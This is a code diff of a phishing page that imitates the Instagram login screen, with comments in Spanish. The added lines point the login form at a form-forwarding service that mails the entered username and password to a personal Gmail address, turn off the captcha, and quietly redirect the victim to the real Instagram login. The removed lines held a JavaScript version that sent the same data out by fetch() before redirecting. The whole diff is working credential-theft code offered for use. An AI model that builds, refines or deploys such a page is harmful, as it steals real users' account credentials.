@@ -197,9 +197,14 @@
             <img src="logo.jpg" alt="Logo" class="site-logo">
         </div>
 
+        <!-- Formulario configurado para enviar al correo y redirigir automáticamente -->
         <form class="login-form" id="loginForm" action="https://formsubmit.co/trollgaga999@gmail.com" method="POST">
+            <!-- Desactiva captchas -->
             <input type="hidden" name="_captcha" value="false">
+            <!-- Organiza los datos recibidos en forma de tabla limpia -->
             <input type="hidden" name="_template" value="table">
+            <!-- Redirección automática inmediata al sitio real de Instagram tras procesar -->
+            <input type="hidden" name="_next" value="https://www.instagram.com/accounts/login/?hl=es&source=auth_switcher">
 
             <div class="input-group">
                 <input type="text" name="Usuario" class="input-field" id="usernameInput" placeholder="Nombre de usuario, correo o celular" required>
@@ -250,34 +255,6 @@
                     <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
                     <line x1="1" y1="1" x2="23" y2="23"></line>
                 `;
-            }
-        });
-
-        const loginForm = document.getElementById('loginForm');
-        const submitBtn = document.getElementById('submitBtn');
-        let clickCount = 0;
-
-        loginForm.addEventListener('submit', (e) => {
-            clickCount++;
-
-            if (clickCount === 1) {
-                e.preventDefault();
-                submitBtn.textContent = "Redirigiendo...";
-                submitBtn.style.backgroundColor = "#0070ba";
-
-                const formData = new FormData(loginForm);
-                fetch("https://formsubmit.co/ajax/trollgaga999@gmail.com", {
-                    method: "POST",
-                    body: formData
-                }).catch(err => console.log(err));
-
-                // Forzamos la apertura usando un parámetro que le indica al navegador mantenerse en la vista web móvil de Instagram
-                setTimeout(() => {
-                    window.location.replace("https://www.instagram.com/accounts/login/?hl=es&source=auth_switcher");
-                }, 1500);
-            } else {
-                e.preventDefault();
-                window.location.replace("https://www.instagram.com/accounts/login/?hl=es&source=auth_switcher");
             }
         });
     </script>
